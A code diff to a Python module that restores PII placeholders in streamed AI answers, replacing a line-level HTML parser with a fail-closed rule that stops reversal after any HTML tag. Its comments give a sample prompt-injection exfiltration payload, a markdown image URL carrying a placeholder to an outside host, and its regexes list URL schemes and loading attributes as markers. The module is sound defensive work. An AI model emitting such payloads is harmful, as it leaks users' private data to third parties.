@@ -320,55 +320,39 @@ class PlaceholderAligner:
         return held
 
 
-# r1 MAJOR-3, r2 MAJOR-r2-1 and r3 MAJOR-r3-1 (KARARLAR "C17 geri çevirme bağlam istisnası", "C17
-# URL bağlam kuralı satır düzeyinde ve fail-closed" and its addendum): an upstream (external
-# agent, provider, injected instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a
-# client that loads images would send the value to that host. The rule is per line and by class,
-# not per URL spelling: no placeholder is reversed on a line with an HTML tag (`<` and a letter;
-# a placeholder is not one), a URL scheme with its colon, or a markdown/CSS/attribute marker.
-_HTML_TAG = r"<(?!PII_\d)[a-z]"
-_ATTRS = r"(?:src|href|srcset|action|poster|background|style|data)"
+# r1 MAJOR-3 … r4 MAJOR-r4-1 (KARARLAR "C17 geri çevirme bağlam istisnası", "C17 URL bağlam kuralı
+# satır düzeyinde ve fail-closed" with its addendum, "C17 geri çevirme: cevap düzeyinde HTML
+# fail-closed"): an upstream (external agent, provider, injected instruction) could write
+# `![x](https://its-host/?q=<<PII_1>>)` or an HTML tag that loads a URL, and a client that renders
+# it would send the value to that host. Two rules, neither of which follows HTML:
+# - HTML, per answer: after the first tag (`<` and a letter; a whole placeholder is no tag) no
+#   placeholder of the rest of the answer is reversed. Four rounds of respellings (quotes,
+#   blocks, CSS and entity escapes) showed that a line model of HTML is never complete.
+# - Markdown and URLs, per line: no placeholder is reversed on a line with a URL scheme and its
+#   colon or a marker; a markdown target left open at the end of its line carries the rule to the
+#   next line, until it closes or a blank line ends it (CommonMark).
+_HTML_TAG = re.compile(r"<(?!(?<=<<)PII_\d{1,8}>>)[a-z]", re.IGNORECASE)
 _URL_MARKER = re.compile(
-    r"\]\(|\]:|//|url\(|"
-    + _HTML_TAG
-    + r"|\b(?:https?|ftp|data|javascript|blob|file):|\b"
-    + _ATTRS
-    + r"\s*=",
+    r"\]\(|\]:|//|url\(|\b(?:https?|ftp|data|javascript|blob|file):"
+    r"|\b(?:src|href|srcset|action|poster|background|style|data)\s*=",
     re.IGNORECASE,
 )
-# What opens a target that may go on past the end of its line (an HTML tag, a quoted attribute
-# value, a markdown destination or CSS `url(`, `]:` or `=` with the value on the next line): the
-# next line is under the rule too, until the target closes. An attribute name that ends a line
-# carries "a value is due".
-_URL_OPENER = re.compile(
-    r"\]\(<|\]\(|url\(|\]:|" + _HTML_TAG + r"|\b" + _ATTRS + r"\s*=", re.IGNORECASE
-)
-_ATTR_NAME_END = re.compile(r"\b" + _ATTRS + r"\s*\Z", re.IGNORECASE)
+# What opens a markdown target that may go on past the end of its line.
+_URL_OPENER = re.compile(r"\]\(<|\]\(|\]:")
 _LINE_BREAK = re.compile(r"\r\n|\r|\n")
 _PARENS = re.compile(r"[()]")
-_TAG_STOP = re.compile(r"[>\"']")
-_TARGET_OPEN = {'"': "dq", "'": "sq"}
-# mode -> (what closes it, the mode after it)
-_TARGET_CLOSE = {
-    "dq": ('"', None),
-    "sq": ("'", None),
-    "angle": (">", None),
-    "tag_dq": ('"', "tag"),
-    "tag_sq": ("'", "tag"),
-}
-# How much of a stream's current line is kept to see a marker split over chunks; a line longer
-# than this lost its start and its placeholders are kept (fail-closed).
+# How much of a stream's current line is kept to see an open markdown target; a longer line lost
+# its start and its placeholders are kept (fail-closed).
 URL_CONTEXT_MAX_CHARS = 8192
 # How much of the text before a piece the scan looks at again, so a marker split over pieces is
-# seen; longer than every marker (spaces between an attribute name and `=` are `_gap`).
+# seen; longer than every marker.
 _MARKER_OVERLAP = 32
 
 
 def _open_target(line: str, mode: str | int | None) -> str | int | None:
-    """The target still open at the end of `line`, given the one open at its start: None, a
-    markdown destination's paren depth (positive) or CSS `url(`'s (negative), "md_expect" or
-    "expect" (a markdown or an HTML value is due), "tag" (inside an HTML tag) or the quote/angle
-    that closes it."""
+    """The markdown target still open at the end of `line`, given the one open at its start:
+    None, a destination's paren depth, "angle" (`](<`, closed by `>`) or "md_expect" (`]:`, its
+    value is due)."""
     i = 0
     while i < len(line):
         if mode == "md_expect":
@@ -378,80 +362,58 @@ def _open_target(line: str, mode: str | int | None) -> str | int | None:
                 return mode
             mode = "angle" if line[i] == "<" else None
             i += 1 if mode else 0
-        elif mode == "expect":
-            while i < len(line) and line[i] in " \t=":
-                i += 1
-            if i == len(line):
-                return mode
-            mode = _TARGET_OPEN.get(line[i])
-            i += 1 if mode else 0
         elif mode is None:
             opener = _URL_OPENER.search(line, i)
             if opener is None:
-                break
-            i, token = opener.end(), opener.group(0).lower()
-            if token == "](<":
-                mode = "angle"
-            elif token == "](":
-                mode = 1
-            elif token == "url(":
-                mode = -1
-            elif token.startswith("<"):
-                mode = "tag"
-            else:
-                mode = "md_expect" if token == "]:" else "expect"
-        elif mode == "tag":
-            stop = _TAG_STOP.search(line, i)
-            if stop is None:
+                return None
+            i = opener.end()
+            mode = {"](<": "angle", "](": 1, "]:": "md_expect"}[opener.group(0)]
+        elif mode == "angle":
+            j = line.find(">", i)
+            if j < 0:
                 return mode
-            i = stop.end()
-            mode = {">": None, '"': "tag_dq", "'": "tag_sq"}[stop.group(0)]
-        elif isinstance(mode, int):
+            mode, i = None, j + 1
+        else:
             paren = _PARENS.search(line, i)
             if paren is None:
                 return mode
             i = paren.end()
-            step = 1 if mode > 0 else -1
-            mode = mode + step if paren.group(0) == "(" else (mode - step or None)
-        else:
-            closer, after = _TARGET_CLOSE[mode]
-            j = line.find(closer, i)
-            if j < 0:
-                return mode
-            mode, i = after, j + 1
-    if mode is None and _ATTR_NAME_END.search(line):
-        return "expect"
+            mode = mode + 1 if paren.group(0) == "(" else (mode - 1 or None)
     return mode
 
 
-def _closes_on_blank(mode: str | int | None) -> bool:
-    return mode in ("angle", "md_expect") or (isinstance(mode, int) and mode > 0)
-
-
 class UrlLines:
-    """Which parts of a text, or of a stream fed piece by piece, sit on a URL line: `spans` takes
-    the next piece and returns its (start, end) ranges whose placeholders are kept.
+    """Which parts of a text, or of a stream fed piece by piece, keep their placeholders:
+    `spans` takes the next piece and returns its (start, end) ranges under the rules above.
 
     The scan is incremental (r3 MAJOR-r3-2, KARARLAR "C17 URL bağlam kuralı, ek" (c)): a piece is
-    scanned with the last `_MARKER_OVERLAP` characters before it, and not at all once its line
-    is marked or cut; the line's text is kept only while its open target may be needed."""
+    scanned with the last `_MARKER_OVERLAP` characters before it, and not at all once the answer
+    has HTML; the line's text is kept only while its open target may be needed."""
 
     def __init__(self) -> None:
         self._pieces: list[str] = []  # the current line, while it is at most the window
         self._length = 0
         self._tail = ""  # the current line's last _MARKER_OVERLAP characters
-        self._gap = False  # the line ends with an attribute name and spaces: `=` may follow
         self._cut = False  # the current line is longer than URL_CONTEXT_MAX_CHARS
         self._marked = False  # a marker was seen on the current line
-        self._open: str | int | None = None  # the target open at the start of the current line
-        self._lost = False  # a URL line lost its start: what it left open is unknown
+        self._open: str | int | None = None  # the markdown target open at the line's start
+        self._lost = False  # an open line lost its start: what it left open is unknown
         self._blank = True  # the current line has only whitespace so far
+        self._html = False  # the answer has had an HTML tag: nothing more is reversed
 
     def spans(self, text: str) -> list[tuple[int, int]]:
+        if self._html:
+            return [(0, len(text))]
+        breaks = list(_LINE_BREAK.finditer(text))
+        if breaks and breaks[-1].group(0) == "\r" and breaks[-1].end() == len(text):
+            breaks.pop()  # a CR that ends the piece may be half a CRLF: the line goes on
         out, start = [], 0
-        for brk in [*_LINE_BREAK.finditer(text), None]:
+        for brk in [*breaks, None]:
             end = brk.start() if brk else len(text)
-            self._add(text[start:end])
+            self._add(text[start:end] if brk else text[start:])
+            if self._html:
+                out.append((start, len(text)))
+                return out
             if self._lost or self._open is not None or self._marked or self._cut:
                 out.append((start, end))
             if brk is None:
@@ -475,22 +437,17 @@ class UrlLines:
                 self._cut, self._pieces = True, []
             else:
                 self._pieces.append(piece)
-        if self._marked:
-            return
-        if self._gap and piece.lstrip()[:1] == "=":
-            self._marked = True  # `src` + any number of spaces + `=`
-            return
         window = self._tail + piece
-        if _URL_MARKER.search(window):
-            self._marked = True
-            return
-        self._gap = (self._gap and piece.isspace()) or _ATTR_NAME_END.search(window) is not None
         self._tail = window[-_MARKER_OVERLAP:]
+        if _HTML_TAG.search(window):
+            self._html = self._marked = True
+        elif not self._marked and _URL_MARKER.search(window):
+            self._marked = True
 
     def _end_line(self) -> None:
-        if self._blank and _closes_on_blank(self._open):
-            # r3 MINOR-r3-4, KARARLAR ek (e): a markdown target does not cross a blank line; an
-            # HTML one may (a browser drops line breaks from a URL), and a lost state is unknown.
+        if self._blank and self._open is not None:
+            # r3 MINOR-r3-4, KARARLAR ek (e): a markdown target does not cross a blank line; a
+            # lost state is unknown and goes on.
             self._open = None
         elif self._marked or self._open is not None:
             if self._cut:
@@ -498,7 +455,7 @@ class UrlLines:
             elif not self._lost:
                 self._open = _open_target("".join(self._pieces), self._open)
         self._pieces, self._length, self._tail = [], 0, ""
-        self._gap = self._cut = self._marked = False
+        self._cut = self._marked = False
         self._blank = True
 
 
